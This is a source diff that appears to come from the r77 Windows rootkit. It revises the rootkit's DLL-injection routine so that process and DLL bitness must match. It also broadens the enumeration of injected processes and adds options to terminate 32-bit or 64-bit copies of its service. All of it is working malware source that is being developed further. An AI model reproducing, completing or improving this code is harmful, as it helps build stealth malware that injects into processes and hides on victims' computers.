@@ -8,9 +8,9 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 {
 	BOOL result = FALSE;
 
-	// Unlike with "regular" DLL injection, the bitness must be checked explicitly.
-	BOOL is64Bit;
-	if (Is64BitProcess(processId, &is64Bit) && BITNESS(is64Bit ? 64 : 32))
+	// The bitness of the process must match the bitness of the DLL, otherwise the process will crash.
+	BOOL isProcess64Bit, isDll64Bit;
+	if (Is64BitProcess(processId, &isProcess64Bit) && IsExecutable64Bit(dll, &isDll64Bit) && isProcess64Bit == isDll64Bit)
 	{
 		HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, processId);
 		if (process)
@@ -106,7 +106,7 @@ BOOL GetR77Processes(PR77_PROCESS r77Processes, LPDWORD count)
 			HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
 			if (process)
 			{
-				if (EnumProcessModules(process, modules, 10000 * sizeof(HMODULE), &moduleCount))
+				if (EnumProcessModulesEx(process, modules, 10000 * sizeof(HMODULE), &moduleCount, LIST_MODULES_ALL))
 				{
 					moduleCount /= sizeof(HMODULE);
 
@@ -207,7 +207,7 @@ VOID DetachAllInjectedProcesses()
 
 	FREE(r77Processes);
 }
-VOID TerminateR77Service(DWORD excludedProcessId)
+VOID TerminateR77Service(DWORD excludedProcessId, BOOL include32BitProcess, BOOL include64BitProcess)
 {
 	PR77_PROCESS r77Processes = NEW_ARRAY(R77_PROCESS, 1000);
 	DWORD r77ProcessCount = 1000;
@@ -217,11 +217,18 @@ VOID TerminateR77Service(DWORD excludedProcessId)
 		{
 			if (r77Processes[i].Signature == R77_SERVICE_SIGNATURE && r77Processes[i].ProcessId != excludedProcessId)
 			{
-				HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, r77Processes[i].ProcessId);
-				if (process)
+				BOOL is64Bit;
+				if (Is64BitProcess(r77Processes[i].ProcessId, &is64Bit))
 				{
-					TerminateProcess(process, 0);
-					CloseHandle(process);
+					if (is64Bit && include64BitProcess || !is64Bit && include32BitProcess)
+					{
+						HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, r77Processes[i].ProcessId);
+						if (process)
+						{
+							TerminateProcess(process, 0);
+							CloseHandle(process);
+						}
+					}
 				}
 			}
 		}
